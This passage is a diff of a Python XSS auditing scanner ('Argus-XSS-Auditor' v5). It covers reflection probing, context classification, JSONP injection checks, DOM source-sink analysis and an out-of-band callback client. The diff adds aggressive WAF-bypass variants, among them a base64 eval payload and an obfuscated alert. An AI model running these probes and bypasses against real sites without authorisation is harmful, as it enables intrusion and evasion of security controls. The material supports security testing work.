-    preg_replace('/[^a-f0-9]/i') then enforces strlen >= 16; 32 hex = 128 bits.
-    """
     return secrets.token_hex(HUGINN_TOKEN_BYTES)
 
 
 def _looks_denied(resp: Optional[requests.Response]) -> bool:
+    # v5 fix: network error is NOT a denial (was True in v4 — losing findings)
     if resp is None:
-        return True
-    if 200 <= resp.status_code < 300:
-        body_low = _body(resp).lower()[:2000]
-        return any(m in body_low for m in DENIAL_MARKERS)
-    return False
-
-
-def _fingerprint_waf(resp: Optional[requests.Response]) -> str:
-    if resp is None:
-        return ""
-    headers_str = " ".join(f"{k} {v}" for k, v in resp.headers.items()).lower()
+        return False
     body_low = _body(resp).lower()[:2000]
-    for waf, sigs in WAF_SIGNATURES.items():
-        for sig in sigs:
-            if sig in headers_str or sig in body_low:
-                return waf
-    return ""
+    return any(m in body_low for m in DENIAL_MARKERS)
 
 
 def _content_type_kind(ct: str) -> str:
-    """Classify content-type into a coarse kind for handling decisions."""
     ct = (ct or "").split(";")[0].strip().lower()
     if not ct:
         return "unknown"
@@ -740,7 +888,7 @@ def _content_type_kind(ct: str) -> str:
     for p in MARKDOWN_CONTENT_PREFIXES:
         if ct.startswith(p):
             return "markdown"
-    return "html"          # html, xhtml, text/*, unknown
+    return "html"
 
 
 def _is_executable_content_type(ct: str) -> bool:
@@ -748,7 +896,7 @@ def _is_executable_content_type(ct: str) -> bool:
 
 
 def _probe(
-    session: Session, surface: dict, payload: str,
+    session: EvasionSession, surface: dict, payload: str,
     extra_headers: Optional[dict] = None,
 ) -> Optional[requests.Response]:
     headers = extra_headers or None
@@ -766,79 +914,129 @@ def _probe(
     return None
 
 
+def _fingerprint_sanitizer(body: str, headers: dict) -> tuple[str, str]:
+    """Detect which sanitizer / templating framework is running."""
+    blob = body[:20000]
+    hdr_blob = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
+    for sanitizer, sigs in SANITIZER_SIGNATURES.items():
+        for sig in sigs:
+            if re.search(sig, blob, re.I):
+                version = ""
+                m = re.search(rf"{sanitizer}[\s/._-]*v?(\d+\.\d+(?:\.\d+)?)",
+                              blob, re.I)
+                if m:
+                    version = m.group(1)
+                return sanitizer, version
+    if "x-xss-protection" in hdr_blob:
+        return "X-XSS-Protection", ""
+    return "", ""
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  CHAINS
+# ═════════════════════════════════════════════════════════════════════════════
+
+def _chain_ids_for(f: XSSFinding) -> list[str]:
+    ids: list[str] = []
+    if not f.confirmed and f.severity.rank < Severity.HIGH.rank:
+        return ids
+    if f.xss_type == "reflected":
+        ids.append("xss-reflected")
+    elif f.xss_type == "stored":
+        ids.append("xss-stored")
+    elif f.xss_type == "blind":
+        ids.append("xss-blind")
+    elif f.xss_type == "dom":
+        ids.append("xss-dom")
+    elif f.xss_type == "jsonp":
+        ids.append("xss-jsonp")
+    elif f.xss_type == "header":
+        ids.append("xss-reflected")
+    elif f.xss_type == "csp":
+        if "unsafe-inline" in f.payload or "wildcard" in f.evidence.lower():
+            ids.append("xss-csp-bypass")
+        if "report-only" in f.evidence.lower() or "missing" in f.evidence.lower():
+            ids.append("xss-csp-missing")
+    if f.bypass_used and f.bypass_used not in ("", "none"):
+        ids.append("xss-waf-bypass")
+    return ids
+
+
+def build_chains(findings: list[XSSFinding]) -> list[XSSChain]:
+    chains: dict[str, list[XSSFinding]] = {}
+    NAMES = {
+        "xss-reflected":      "Reflected XSS confirmed",
+        "xss-stored":         "Stored XSS confirmed",
+        "xss-blind":          "Blind XSS confirmed via OOB callback",
+        "xss-dom":            "DOM XSS source→sink confirmed",
+        "xss-waf-bypass":     "WAF bypassed with variant payload",
+        "xss-jsonp":          "JSONP callback injection",
+        "xss-csp-bypass":     "XSS against bypassable CSP",
+        "xss-csp-missing":    "No CSP — MITM amplification",
+        "xss-cookie-theft":   "XSS + missing HttpOnly on session cookie",
+        "xss-waf-protected":  "WAF actively blocks XSS payloads",
+    }
+    for f in findings:
+        for cid in (_chain_ids_for(f) or f.chain_ids):
+            chains.setdefault(cid, []).append(f)
+            if cid not in f.chain_ids:
+                f.chain_ids.append(cid)
+    out: list[XSSChain] = []
+    for cid, fs in chains.items():
+        max_sev = max(fs, key=lambda x: x.severity.rank).severity
+        out.append(XSSChain(
+            chain_id=cid, name=NAMES.get(cid, cid), severity=max_sev,
+            steps=[x.evidence for x in fs],
+            finding_hashes=[x.finding_hash for x in fs],
+            evidence=fs[0].evidence if fs else "",
+        ))
+    return out
+
+
 # ═════════════════════════════════════════════════════════════════════════════
 #  HUGINN OOB CLIENT
 # ═════════════════════════════════════════════════════════════════════════════
 
 class HuginnClient:
-    """
-    Read-side client for a Huginn OOB receiver.
-
-    Single-token lookup (?token=<hex>) is public by Huginn's design — knowing
-    the token IS the proof of ownership (Burp Collaborator model). The
-    read_key is optional and reserved for aggregate views (?list, ?tail).
-
-    Thread-safe: one requests.Session per instance; callers instantiate once.
-    """
-
-    def __init__(
-        self, base_url: str, *,
-        read_key: Optional[str] = None,
-        timeout: int = 10,
-        verify_tls: bool = True,
-    ):
+    def __init__(self, base_url: str, *, read_key: Optional[str] = None,
+                 timeout: int = 10, verify_tls: bool = True):
         self.base_url = base_url.rstrip("/")
         self.check_url = f"{self.base_url}/check.php"
         self.read_key = read_key or ""
         self.timeout = timeout
         self._session = requests.Session()
         self._session.verify = verify_tls
-        self._session.headers["User-Agent"] = "Argus-XSS-Auditor/4.0 (huginn)"
+        self._session.headers["User-Agent"] = "Argus-XSS-Auditor/5.0 (huginn)"
         if self.read_key:
             self._session.headers["Authorization"] = f"Bearer {self.read_key}"
 
-    # ── Payload URL construction ────────────────────────────────────────────
     def payload_url_path(self, token: str) -> str:
-        """Path mode — no wildcard DNS/cert required."""
         return f"{self.base_url}/huginn-{token}/"
 
     def payload_url_subdomain(self, token: str) -> str:
-        """Subdomain mode — requires *.oast.<domain> DNS + wildcard cert."""
         host = urllib.parse.urlparse(self.base_url).hostname or ""
         return f"https://{token}.{host}/"
 
-    # ── Read side ───────────────────────────────────────────────────────────
     def check_token(self, token: str) -> dict:
-        """
-        Returns {'found': bool, 'entries': [...], 'error': str?}
-        Never raises — network errors become found=False.
-        """
         try:
-            r = self._session.get(
-                self.check_url, params={"token": token}, timeout=self.timeout,
-            )
+            r = self._session.get(self.check_url, params={"token": token},
+                                  timeout=self.timeout)
         except requests.RequestException as e:
             return {"found": False, "entries": [], "error": f"network: {e}"}
-
         if r.status_code >= 400:
             return {"found": False, "entries": [],
                     "error": f"HTTP {r.status_code}: {r.text[:200]}"}
-
         try:
             j = r.json()
         except ValueError:
             return {"found": False, "entries": [], "error": "non-JSON reply"}
-
         entries = j.get("entries") or []
         if not entries and j.get("entry"):
             entries = [j["entry"]]
         return {"found": bool(j.get("found")), "entries": entries}
 
-    def poll_until_hit(
-        self, token: str, *,
-        max_wait: int = HUGINN_POLL_TIMEOUT,
-        interval: int = HUGINN_POLL_INTERVAL,
-    ) -> dict:
+    def poll_until_hit(self, token: str, *, max_wait: int = HUGINN_POLL_TIMEOUT,
+                       interval: int = HUGINN_POLL_INTERVAL) -> dict:
         deadline = time.monotonic() + max_wait
         last = {"found": False, "entries": []}
         while True:
@@ -865,9 +1063,8 @@ def discover_query_surfaces(urls: list[str]) -> list[dict]:
             if key in seen:
                 continue
             seen.add(key)
-            surfaces.append({
-                "url": url, "param": pname, "location": "query", "method": "GET",
-            })
+            surfaces.append({"url": url, "param": pname,
+                             "location": "query", "method": "GET"})
     return surfaces
 
 
@@ -879,7 +1076,6 @@ def discover_body_surfaces(outdir: Path) -> list[dict]:
         data = json.loads(pages_file.read_text())
     except Exception:
         return []
-
     surfaces: list[dict] = []
     seen: set[tuple] = set()
     for page in data.get("pages") or []:
@@ -896,10 +1092,8 @@ def discover_body_surfaces(outdir: Path) -> list[dict]:
                 if key in seen:
                     continue
                 seen.add(key)
-                surfaces.append({
-                    "url": action, "param": fname,
-                    "location": "body", "method": "POST",
-                })
+                surfaces.append({"url": action, "param": fname,
+                                 "location": "body", "method": "POST"})
     return surfaces
 
 
@@ -907,20 +1101,15 @@ def discover_body_surfaces(outdir: Path) -> list[dict]:
 #  BASELINE
 # ═════════════════════════════════════════════════════════════════════════════
 
-def build_baseline(session: Session, surface: dict) -> Baseline:
-    baseline = Baseline(
-        url=surface["url"], param=surface["param"],
-        location=surface["location"],
-    )
+def build_baseline(session: EvasionSession, surface: dict) -> Baseline:
+    baseline = Baseline(url=surface["url"], param=surface["param"],
+                        location=surface["location"])
     times: list[float] = []
-
     for _ in range(BASELINE_SAMPLES):
         start = time.monotonic()
         if surface["location"] == "body":
-            resp = session.request(
-                surface.get("method", "POST"), surface["url"],
-                data={surface["param"]: "argusbaseline"},
-            )
+            resp = session.request(surface.get("method", "POST"), surface["url"],
+                                   data={surface["param"]: "argusbaseline"})
         else:
             resp = session.get(surface["url"])
         times.append(time.monotonic() - start)
@@ -929,9 +1118,11 @@ def build_baseline(session: Session, surface: dict) -> Baseline:
             baseline.body = _body(resp)
             baseline.length = len(baseline.body)
             baseline.content_type = resp.headers.get("Content-Type", "")
-            baseline.waf = _fingerprint_waf(resp)
+            baseline.nosniff = (resp.headers.get("X-Content-Type-Options", "").lower() == "nosniff")
+            sanitizer, version = _fingerprint_sanitizer(baseline.body, dict(resp.headers))
+            baseline.sanitizer = sanitizer
+            baseline.sanitizer_version = version
         time.sleep(REQUEST_SLEEP)
-
     if times:
         baseline.median_time = statistics.median(times)
     return baseline
@@ -951,16 +1142,14 @@ def _marker_in_encoded_form(body: str, marker: str) -> bool:
     return False
 
 
-def probe_reflection(session: Session, surface: dict) -> dict:
+def probe_reflection(session: EvasionSession, surface: dict) -> dict:
     marker1 = _new_marker()
     resp = _probe(session, surface, marker1)
     time.sleep(REQUEST_SLEEP)
-
     result = {"reflected": False, "index": -1, "marker": marker1,
               "unencoded": False, "cache_hit": False}
     if resp is None:
         return result
-
     body = _body(resp)
     idx = body.find(marker1)
     if idx >= 0:
@@ -984,7 +1173,6 @@ def probe_reflection(session: Session, surface: dict) -> dict:
         result["cache_hit"] = True
         result["reflected"] = False
         return result
-
     return result
 
 
@@ -995,153 +1183,93 @@ def probe_reflection(session: Session, surface: dict) -> dict:
 def classify_context(body: str, index: int) -> str:
     if index < 0 or index >= len(body):
         return "unknown"
-
     prefix = body[:index].lower()
-
-    in_comment = False
-    in_script = False
-    in_style = False
+    in_comment = in_script = in_style = False
     in_raw_text = ""
     in_tag = False
     quote = ""
     last_attr = ""
     in_js_string = ""
     js_escape = False
-
-    i = 0
-    n = len(prefix)
+    i, n = 0, len(prefix)
     while i < n:
         ch = prefix[i]
-
         if in_comment:
             if prefix.startswith("-->", i):
-                in_comment = False
-                i += 3
-                continue
-            i += 1
-            continue
-
+                in_comment = False; i += 3; continue
+            i += 1; continue
         if in_raw_text:
             close = f"</{in_raw_text}"
             if prefix.startswith(close, i):
-                in_raw_text = ""
-                i += len(close)
-                continue
-            i += 1
-            continue
-
+                in_raw_text = ""; i += len(close); continue
+            i += 1; continue
         if in_script:
             if prefix.startswith("</script", i):
-                in_script = False
-                in_style = False
-                i += 8
-                continue
+                in_script = False; in_style = False; i += 8; continue
             if in_style:
                 if prefix.startswith("</style", i):
-                    in_style = False
-                    in_script = False
-                    i += 7
-                    continue
-                i += 1
-                continue
+                    in_style = False; in_script = False; i += 7; continue
+                i += 1; continue
             if js_escape:
-                js_escape = False
-                i += 1
-                continue
+                js_escape = False; i += 1; continue
             if ch == "\\":
-                js_escape = True
-                i += 1
-                continue
+                js_escape = True; i += 1; continue
             if in_js_string:
                 if ch == in_js_string:
                     in_js_string = ""
-                i += 1
-                continue
+                i += 1; continue
             if ch in ("'", '"', "`"):
-                in_js_string = ch
-                i += 1
-                continue
-            i += 1
-            continue
-
+                in_js_string = ch; i += 1; continue
+            i += 1; continue
         if in_tag:
             if quote:
                 if ch == quote:
                     quote = ""
-                i += 1
-                continue
+                i += 1; continue
             if ch in ("'", '"'):
-                quote = ch
-                i += 1
-                continue
+                quote = ch; i += 1; continue
             if ch == ">":
-                in_tag = False
-                last_attr = ""
-                i += 1
-                continue
+                in_tag = False; last_attr = ""; i += 1; continue
             if ch.isalpha() or ch == "-":
                 j = i
                 while j < n and (prefix[j].isalnum() or prefix[j] in "-_"):
                     j += 1
                 last_attr = prefix[i:j].lower()
-                i = j
-                continue
-            i += 1
-            continue
-
+                i = j; continue
+            i += 1; continue
         if prefix.startswith("<!--", i):
-            in_comment = True
-            i += 4
-            continue
+            in_comment = True; i += 4; continue
         if prefix.startswith("<script", i):
-            in_script = True
-            i += 7
+            in_script = True; i += 7
             gt = prefix.find(">", i)
-            i = (gt + 1) if gt >= 0 else n
-            continue
+            i = (gt + 1) if gt >= 0 else n; continue
         if prefix.startswith("<style", i):
-            in_script = True
-            in_style = True
-            i += 6
+            in_script = True; in_style = True; i += 6
             gt = prefix.find(">", i)
-            i = (gt + 1) if gt >= 0 else n
-            continue
+            i = (gt + 1) if gt >= 0 else n; continue
         if prefix.startswith("<textarea", i):
-            in_raw_text = "textarea"
-            i += 9
+            in_raw_text = "textarea"; i += 9
             gt = prefix.find(">", i)
-            i = (gt + 1) if gt >= 0 else n
-            continue
+            i = (gt + 1) if gt >= 0 else n; continue
         if prefix.startswith("<title", i):
-            in_raw_text = "title"
-            i += 6
+            in_raw_text = "title"; i += 6
             gt = prefix.find(">", i)
-            i = (gt + 1) if gt >= 0 else n
-            continue
+            i = (gt + 1) if gt >= 0 else n; continue
         if ch == "<":
-            in_tag = True
-            last_attr = ""
-            i += 1
+            in_tag = True; last_attr = ""; i += 1
             j = i
             while j < n and (prefix[j].isalnum() or prefix[j] in "-:"):
                 j += 1
-            i = j
-            continue
+            i = j; continue
         i += 1
 
-    if in_comment:
-        return "html_comment"
-    if in_raw_text:
-        return in_raw_text
-    if in_script and in_style:
-        return "css"
+    if in_comment: return "html_comment"
+    if in_raw_text: return in_raw_text
+    if in_script and in_style: return "css"
     if in_script:
-        if in_js_string == "`":
-            return "script_template"
-        if in_js_string == "'":
-            return "script_string_single"
-        if in_js_string == '"':
-            return "script_string_double"
+        if in_js_string == "`": return "script_template"
+        if in_js_string == "'": return "script_string_single"
+        if in_js_string == '"': return "script_string_double"
         return "script_bare"
     if in_tag:
         if quote == '"':
@@ -1157,31 +1285,20 @@ def classify_context(body: str, index: int) -> str:
                 return "event_handler"
             return "attr_single"
         return "attr_unquoted"
-
     return "html_body"
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 4 — ENCODING ANALYSIS (with type reporting)
+#  PHASE 4 — ENCODING ANALYSIS
 # ═════════════════════════════════════════════════════════════════════════════
 
-def analyze_encoding(
-    body: str, index: int, payload: str,
-) -> tuple[list[str], list[str], list[str]]:
-    """
-    Returns (encoded_chars, survived_chars, encoding_types).
-
-    `encoding_types` is a list of human labels like 'entity_decimal',
-    'url_encoded', 'js_escape'. Useful for the retest note in evidence.
-    """
+def analyze_encoding(body: str, index: int, payload: str) -> tuple[list[str], list[str], list[str]]:
     if index < 0:
         return [], [], []
-
     window = body[max(0, index - 50): index + len(payload) + 50]
     encoded: list[str] = []
     survived: list[str] = []
     types: set[str] = set()
-
     for ch in ENCODING_CHARS:
         if ch not in payload:
             continue
@@ -1193,7 +1310,6 @@ def analyze_encoding(
                 encoded.append(ch)
                 types.add(etype)
                 break
-
     return encoded, survived, sorted(types)
 
 
@@ -1201,9 +1317,8 @@ def analyze_encoding(
 #  PHASE 8 — WAF BYPASS VARIANTS
 # ═════════════════════════════════════════════════════════════════════════════
 
-def _waf_variants(payload: str) -> list[tuple[str, str]]:
+def _waf_variants(payload: str, aggressive: bool = False) -> list[tuple[str, str]]:
     variants: list[tuple[str, str]] = []
-
     mixed = re.sub(
         r"\b(svg|img|script|alert|onload|onerror|onmouseover|onfocus)\b",
         lambda m: "".join(c.upper() if i % 2 else c.lower()
@@ -1212,74 +1327,62 @@ def _waf_variants(payload: str) -> list[tuple[str, str]]:
     )
     if mixed != payload:
         variants.append((mixed, "case_mix"))
-
     variants.append((urllib.parse.quote(payload, safe=""), "url_encode"))
-    variants.append(
-        (urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),
-         "double_url_encode")
-    )
-
-    # HTML-entity quotes — surviving WAF regex on "<script>" but breaking
-    # attribute boundaries.
+    variants.append((urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),
+                     "double_url_encode"))
     ent_q = payload.replace('"', "&#34;").replace("'", "&#39;")
     if ent_q != payload:
         variants.append((ent_q, "entity_quotes"))
-
-    # Hex-entity quotes
     hex_q = payload.replace('"', "&#x22;").replace("'", "&#x27;")
     if hex_q != payload:
         variants.append((hex_q, "hex_entity_quotes"))
-
     uni = payload.replace("a", "\\u0061").replace("l", "\\u006c").replace("e", "\\u0065")
     if uni != payload:
         variants.append((uni, "unicode_escape"))
-
-    # \u{...} codepoint form (ES6 — bypasses some JS-context WAFs)
     ucode = payload.replace("a", "\\u{61}").replace("l", "\\u{6c}")
     if ucode != payload:
         variants.append((ucode, "unicode_codepoint"))
-
     nl = payload.replace(" ", "%0a")
     if nl != payload:
         variants.append((nl, "newline_inject"))
-
     nnull = payload.replace(" ", "%00")
     if nnull != payload:
         variants.append((nnull, "null_byte"))
-
     bt = payload.replace('="', "=`").replace('"', "`")
     if bt != payload:
         variants.append((bt, "backtick_attr"))
-
     cb = payload.replace("<svg", "<svg/**/").replace("<img", "<img/**/")
     if cb != payload:
         variants.append((cb, "comment_break"))
-
     slash = payload.replace("<svg ", "<svg/").replace("<img ", "<img/")
     if slash != payload:
         variants.append((slash, "slash_separator"))
-
     tab = payload.replace("<svg ", "<svg%09").replace("<img ", "<img%09")
     if tab != payload:
         variants.append((tab, "whitespace_tab"))
-
     ff = payload.replace("<svg ", "<svg%0c").replace("<img ", "<img%0c")
     if ff != payload:
         variants.append((ff, "whitespace_formfeed"))
-
+    if aggressive:
+        # Extra aggressive-only transforms
+        b64 = "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+        if b64 not in payload:
+            variants.append((b64, "base64_eval"))
+        spaced = re.sub(r"alert\(", "window['al'%2B'ert'](", payload)
+        if spaced != payload:
+            variants.append((spaced, "split_alert"))
     return variants
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 3+4 — CONTEXT-AWARE PAYLOAD TESTING
+#  PHASE 3+4 — CONTEXT-AWARE PAYLOAD TESTING (with multi-fidelity)
 # ═════════════════════════════════════════════════════════════════════════════
 
 def test_context_payloads(
-    session: Session, surface: dict, baseline: Baseline, context: str,
+    session: EvasionSession, surface: dict, baseline: Baseline, context: str,
+    *, aggressive: bool = False, waf_vendor: str = "",
 ) -> list[XSSFinding]:
     findings: list[XSSFinding] = []
-
-    # Content-type override: an SVG/XML response uses its own payload set.
     ct_kind = _content_type_kind(baseline.content_type)
     effective_context = context
     if ct_kind == "svg" and context in ("html_body", "unknown"):
@@ -1287,10 +1390,8 @@ def test_context_payloads(
     elif ct_kind == "xml" and context in ("html_body", "unknown"):
         effective_context = "xml"
 
-    payloads = (
-        CONTEXT_PAYLOADS.get(effective_context) or CONTEXT_PAYLOADS["unknown"]
-    )[:MAX_CONTEXT_PAYLOADS]
-
+    max_payloads = MAX_CONTEXT_PAYLOADS_AGGRESSIVE if aggressive else MAX_CONTEXT_PAYLOADS
+    payloads = (CONTEXT_PAYLOADS.get(effective_context) or CONTEXT_PAYLOADS["unknown"])[:max_payloads]
     sent: set[str] = set()
 
     for template in payloads:
@@ -1304,36 +1405,52 @@ def test_context_payloads(
         time.sleep(REQUEST_SLEEP)
         if resp is None or _looks_denied(resp):
             continue
-
         body = _body(resp)
         idx = body.find(payload)
 
         if idx >= 0:
+            # Multi-fidelity: fire once more, require consistent reflection
+            consistency = 1
+            for _ in range(MULTI_FIDELITY_ATTEMPTS - 1):
+                v_resp = _probe(session, surface, payload)
+                time.sleep(REQUEST_SLEEP)
+                if v_resp and payload in _body(v_resp):
+                    consistency += 1
+            multi_ok = consistency >= MULTI_FIDELITY_ATTEMPTS
+
             encoded, survived, enc_types = analyze_encoding(body, idx, payload)
             executable = (
                 "(" in survived and ")" in survived
                 and any(c in survived for c in ("<", '"', "'", "`"))
             )
+            severity = Severity.CRITICAL if (executable and multi_ok) else (
+                Severity.HIGH if executable else Severity.MEDIUM
+            )
+            confidence = 95 if (executable and multi_ok) else (
+                90 if executable else 70
+            )
             findings.append(XSSFinding(
                 target=surface["url"], param=surface["param"],
                 param_location=surface["location"],
                 xss_type="reflected", context=context,
-                severity="CRITICAL" if executable else "HIGH",
-                confidence=92 if executable else 70,
-                confirmed=executable,
+                severity=severity, confidence=confidence,
+                confirmed=executable and multi_ok,
                 payload=payload, marker=marker,
                 evidence=(
-                    f"Payload survived UNENCODED in {context} context — "
+                    f"Payload survived UNENCODED in {context} context"
+                    f" (multi-fidelity {consistency}/{MULTI_FIDELITY_ATTEMPTS}) — "
                     f"survived: {''.join(survived) or '(none)'}"
                     + (f"; encoding_types={','.join(enc_types)}" if enc_types else "")
                 ),
                 encoded_chars=encoded, survived_chars=survived,
-                http_status=resp.status_code,
+                http_status=resp.status_code, waf_vendor=waf_vendor,
                 details={
                     "reflection_index": idx, "context": context,
                     "content_type": baseline.content_type,
                     "executable": executable,
+                    "multi_fidelity": consistency,
                     "encoding_types": enc_types,
+                    "sanitizer": baseline.sanitizer,
                     "body_snippet": body[max(0, idx - 80): idx + len(payload) + 80],
                 },
             ))
@@ -1346,22 +1463,21 @@ def test_context_payloads(
                 target=surface["url"], param=surface["param"],
                 param_location=surface["location"],
                 xss_type="reflected", context=context,
-                severity="MEDIUM", confidence=55, confirmed=False,
-                payload=payload, marker=marker,
-                evidence=(
-                    f"Marker reflected in {context} but payload was filtered/modified"
-                    + (f"; encoding_types={','.join(enc_types)}" if enc_types else "")
-                ),
+                severity=Severity.LOW, confidence=55, confirmed=False,
+                payload=payload, marker=marker, waf_vendor=waf_vendor,
+                evidence=(f"Marker reflected in {context} but payload was filtered/modified"
+                          + (f"; encoding_types={','.join(enc_types)}" if enc_types else "")),
                 encoded_chars=encoded, survived_chars=survived,
                 http_status=resp.status_code,
                 details={"body_snippet": body[max(0, midx - 80): midx + 120],
-                         "encoding_types": enc_types},
+                         "encoding_types": enc_types,
+                         "sanitizer": baseline.sanitizer},
             ))
             return findings
 
-        if resp.status_code in WAF_BLOCK_STATUSES:
-            time.sleep(min(2.0, max(0.0, (baseline.median_time * 2) - REQUEST_SLEEP)))
-            for variant, label in _waf_variants(payload):
+        # WAF block → try variants
+        if resp.status_code in WAF_BLOCK_STATUSES or aggressive:
+            for variant, label in _waf_variants(payload, aggressive):
                 v_resp = _probe(session, surface, variant)
                 time.sleep(REQUEST_SLEEP)
                 if v_resp is None or _looks_denied(v_resp):
@@ -1371,88 +1487,60 @@ def test_context_payloads(
                 if v_midx < 0:
                     continue
                 actual_ctx = classify_context(v_body, v_midx)
-                if actual_ctx != context and context != "unknown":
-                    continue
-                encoded, survived, enc_types = analyze_encoding(
-                    v_body, v_midx, variant,
-                )
+                encoded, survived, enc_types = analyze_encoding(v_body, v_midx, variant)
                 findings.append(XSSFinding(
                     target=surface["url"], param=surface["param"],
                     param_location=surface["location"],
                     xss_type="reflected", context=context,
-                    severity="HIGH", confidence=80, confirmed=True,
+                    severity=Severity.HIGH, confidence=80, confirmed=True,
                     payload=variant, marker=marker, bypass_used=label,
-                    evidence=(
-                        f"WAF bypass '{label}' reflected marker in "
-                        f"{actual_ctx} context"
-                    ),
+                    waf_vendor=waf_vendor,
+                    evidence=(f"WAF bypass '{label}' reflected marker in {actual_ctx} context"),
                     encoded_chars=encoded, survived_chars=survived,
                     http_status=v_resp.status_code,
-                    details={
-                        "original_payload": payload,
-                        "variant": variant,
-                        "actual_context": actual_ctx,
-                        "encoding_types": enc_types,
-                    },
+                    details={"original_payload": payload, "variant": variant,
+                             "actual_context": actual_ctx,
+                             "encoding_types": enc_types},
                 ))
                 return findings
-
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  NEW — JSONP CALLBACK INJECTION
+#  JSONP CALLBACK INJECTION
 # ═════════════════════════════════════════════════════════════════════════════
 
-def test_jsonp_injection(
-    session: Session, surface: dict, baseline: Baseline,
-) -> list[XSSFinding]:
-    """
-    JSONP endpoints reflect a `callback` (or similar) parameter verbatim,
-    usually unquoted. That's a direct script-execution primitive on the
-    target origin — functionally XSS-adjacent (classic JSON hijacking /
-    "JSONP XSS").
-    """
+def test_jsonp_injection(session: EvasionSession, surface: dict, baseline: Baseline) -> list[XSSFinding]:
     p = surface["param"].lower()
     if not any(hint in p for hint in JSONP_PARAM_HINTS):
         return []
-
     marker = _new_marker()
     probe_payload = f"{marker}_cb"
     resp = _probe(session, surface, probe_payload)
     time.sleep(REQUEST_SLEEP)
     if resp is None:
         return []
-
     body = _body(resp)
-    # Classic JSONP: response starts with `<marker>_cb(` or similar
     if body.lstrip().startswith(probe_payload + "(") or \
        body.lstrip().startswith("/*") and probe_payload + "(" in body[:200]:
         return [XSSFinding(
             target=surface["url"], param=surface["param"],
             param_location=surface["location"],
-            xss_type="reflected", context="jsonp",
-            severity="HIGH", confidence=85, confirmed=True,
-            payload=f"{probe_payload}",
-            marker=marker,
-            evidence=(
-                f"JSONP callback parameter '{surface['param']}' reflected "
-                f"unquoted at start of response — script-execution primitive"
-            ),
+            xss_type="jsonp", context="jsonp",
+            severity=Severity.HIGH, confidence=85, confirmed=True,
+            payload=f"{probe_payload}", marker=marker,
+            evidence=(f"JSONP callback parameter '{surface['param']}' reflected "
+                      f"unquoted at start of response — script-execution primitive"),
             http_status=resp.status_code,
-            details={
-                "content_type": baseline.content_type,
-                "body_prefix": body[:200],
-                "attack_payload": (
-                    f"{probe_payload};alert(document.domain);//"
-                ),
-            },
+            details={"content_type": baseline.content_type,
+                     "body_prefix": body[:200],
+                     "attack_payload": f"{probe_payload};alert(document.domain);//"},
         )]
     return []
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 5 — DOM XSS STATIC ANALYSIS
+#  DOM XSS STATIC ANALYSIS
 # ═════════════════════════════════════════════════════════════════════════════
 
 def _indentation(line: str) -> int:
@@ -1464,34 +1552,38 @@ def analyze_dom_js(js_url: str, js_content: str, target_page: str) -> list[XSSFi
     if not js_content:
         return findings
 
-    # ── jQuery version check (CVE-2020-11022/11023 territory) ──────────────
-    jq_m = re.search(
-        r"jQuery[^\"'\n]*?v?(\d+)\.(\d+)\.(\d+)", js_content[:8000],
-        re.IGNORECASE,
-    )
+    jq_m = re.search(r"jQuery[^\"'\n]*?v?(\d+)\.(\d+)\.(\d+)", js_content[:8000], re.I)
     if jq_m:
         ver = (int(jq_m.group(1)), int(jq_m.group(2)), int(jq_m.group(3)))
         if ver < JQUERY_MIN_SAFE:
             findings.append(XSSFinding(
-                target=target_page, param="(DOM)",
-                xss_type="dom", context="dom",
-                severity="MEDIUM", confidence=70, confirmed=False,
+                target=target_page, param="(DOM)", xss_type="dom", context="dom",
+                severity=Severity.MEDIUM, confidence=70, confirmed=False,
                 payload=f"jQuery v{'.'.join(map(str, ver))}",
-                evidence=(
-                    f"jQuery {'.'.join(map(str, ver))} < "
-                    f"{'.'.join(map(str, JQUERY_MIN_SAFE))} — "
-                    "vulnerable to html()-with-user-input XSS chains"
-                ),
-                details={
-                    "js_url": js_url, "jquery_version": ver,
-                    "cve_hints": ["CVE-2020-11022", "CVE-2020-11023"],
-                },
+                evidence=(f"jQuery {'.'.join(map(str, ver))} < "
+                          f"{'.'.join(map(str, JQUERY_MIN_SAFE))} — vulnerable to "
+                          "html()-with-user-input XSS chains"),
+                details={"js_url": js_url, "jquery_version": ver,
+                         "cve_hints": ["CVE-2020-11022", "CVE-2020-11023"]},
+            ))
+
+    dp_m = re.search(r"DOMPurify[^\"'\n]*?v?(\d+)\.(\d+)\.(\d+)", js_content[:8000], re.I)
+    if dp_m:
+        ver = (int(dp_m.group(1)), int(dp_m.group(2)), int(dp_m.group(3)))
+        if ver < DOMPURIFY_MIN_SAFE:
+            findings.append(XSSFinding(
+                target=target_page, param="(DOM)", xss_type="dom", context="dom",
+                severity=Severity.MEDIUM, confidence=65, confirmed=False,
+                payload=f"DOMPurify v{'.'.join(map(str, ver))}",
+                evidence=(f"DOMPurify {'.'.join(map(str, ver))} < "
+                          f"{'.'.join(map(str, DOMPURIFY_MIN_SAFE))} — "
+                          "known mXSS bypasses apply"),
+                details={"js_url": js_url, "dompurify_version": ver},
             ))
 
     lines = js_content.splitlines()
     source_lines: dict[str, list[int]] = {}
     sink_lines: dict[str, list[int]] = {}
-
     for i, line in enumerate(lines):
         for src in DOM_SOURCES:
             if src in line:
@@ -1514,33 +1606,26 @@ def analyze_dom_js(js_url: str, js_content: str, target_page: str) -> list[XSSFi
                         continue
                     confidence = 75 if abs(sp - kp) <= 5 else 60
                     findings.append(XSSFinding(
-                        target=target_page, param="(DOM)",
-                        xss_type="dom", context="dom",
-                        severity="HIGH" if confidence >= 75 else "MEDIUM",
+                        target=target_page, param="(DOM)", xss_type="dom", context="dom",
+                        severity=Severity.HIGH if confidence >= 75 else Severity.MEDIUM,
                         confidence=confidence, confirmed=False,
                         payload=f"{src} → {sink}",
-                        evidence=(
-                            f"Source '{src}' flows to sink '{sink}' "
-                            f"within {abs(sp - kp)} lines in {js_url}"
-                        ),
-                        details={
-                            "js_url": js_url, "source": src, "sink": sink,
-                            "source_line": sp + 1, "sink_line": kp + 1,
-                            "snippet": lines[max(0, min(sp, kp) - 2): max(sp, kp) + 3],
-                        },
+                        evidence=(f"Source '{src}' flows to sink '{sink}' within "
+                                  f"{abs(sp - kp)} lines in {js_url}"),
